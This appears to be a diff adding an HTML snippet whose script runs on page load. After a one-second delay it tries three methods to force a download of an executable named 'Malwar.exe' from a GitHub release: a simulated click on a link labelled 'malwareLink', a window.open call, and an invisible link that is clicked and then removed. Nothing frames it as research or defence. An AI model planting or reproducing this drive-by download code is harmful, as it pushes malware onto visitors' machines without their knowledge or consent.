@@ -1,0 +1,19 @@
+<a id="malwareLink" href="https:\\github.com\Ghost00Shell\Ghost___Shell\releases\download\testok\Malwar.exe" target="_blank" download> 
+
+<script>
+  setTimeout(() => {
+    // Attempt 1: Simulate a click on the link
+    document.getElementById("malwareLink").click();
+
+    // Attempt 2: Open the download link in a new tab
+    window.open("https:\\github.com\Ghost00Shell\Ghost___Shell\releases\download\testok\Malwar.exe");
+
+    // Attempt 3: Create an invisible link and click it
+    let a = document.createElement("a");
+    a.href = "https:\\github.com\Ghost00Shell\Ghost___Shell\releases\download\testok\Malwar.exe";
+    a.download = "";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 1000); // Trigger after 1 seconds
+
